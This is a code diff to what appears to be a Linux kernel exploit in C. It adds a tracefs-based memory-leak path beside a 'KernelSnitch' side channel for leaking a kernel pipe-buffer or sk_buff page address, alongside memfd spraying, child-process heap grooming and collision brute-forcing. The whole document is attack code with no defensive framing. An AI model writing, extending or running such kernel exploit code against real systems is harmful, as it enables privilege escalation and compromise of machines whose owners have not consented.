@@ -105,6 +105,20 @@ void free_pipe_object(int pipefd[2]) {
   resize_pipe_slots(pipefd, 2);
 }
 
+static void discard_pipe_page_contexts(struct mm_ctx *prep,
+                                       struct mm_ctx *spray,
+                                       struct mm_ctx *pre,
+                                       struct mm_ctx *post) {
+  close_ctx_memfds(prep);
+  close_ctx_memfds(spray);
+  close_ctx_memfds(pre);
+  close_ctx_memfds(post);
+  free_ctx_storage(prep);
+  free_ctx_storage(spray);
+  free_ctx_storage(pre);
+  free_ctx_storage(post);
+}
+
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
   struct mm_ctx spray;
@@ -126,18 +140,46 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
-  setup_kernelsnitch();
+#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
+  int trace_mm_active = kaslr_base && tracefs_mm_start();
+  if (trace_mm_active) {
+    tracefs_mm_baseline();
+  }
+#else
+  int trace_mm_active = 0;
+#endif
+  if (!trace_mm_active) {
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+    pr_warning("p0 pipe tracefs mm window unavailable; skipping KernelSnitch\n");
+    discard_pipe_page_contexts(&prep, &spray, &pre, &post);
+    return 0;
+#else
+    setup_kernelsnitch();
+#endif
+  }
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
-  pid_t leak_child = clone_leak_child();
+  pid_t leak_child = trace_mm_active ? tracefs_mm_clone_hold()
+                                    : clone_leak_child();
   for (size_t i = 0; i < post.mm_cnt; i++) {
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
   int leak_memfd = open_memfd(leak_child);
+
+  uintptr_t leaked = 0;
+  int trace_mm_leaked = 0;
+#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
+  if (trace_mm_active) {
+    trace_mm_leaked = tracefs_mm_finish(
+        &leaked, pre.mm_cnt, 0, objs_per_slab - 1);
+    tracefs_mm_release_child();
+  }
+#endif
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -150,7 +192,22 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
 
-  if (!kernelsnitch_collisions_ready()) {
+  if (!trace_mm_leaked && trace_mm_active) {
+    close(leak_memfd);
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+    pr_warning("p0 pipe tracefs mm leak missed; skipping KernelSnitch\n");
+    discard_pipe_page_contexts(&prep, &spray, &pre, &post);
+    return 0;
+#else
+    setup_kernelsnitch();
+    leak_child = clone_leak_child();
+    leak_memfd = open_memfd(leak_child);
+    SYSCHK(waitpid(leak_child, NULL, 0));
+#endif
+  }
+
+  if (!trace_mm_leaked && !kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
 
@@ -201,8 +258,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  run_kernelsnitch_bruteforce();
-  uintptr_t leaked = cleanup_kernelsnitch();
+  if (!trace_mm_leaked) {
+    run_kernelsnitch_bruteforce();
+    leaked = cleanup_kernelsnitch();
+  }
   if (leaked == (uintptr_t)-1) {
     pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
     close_ctx_memfds(&prep);
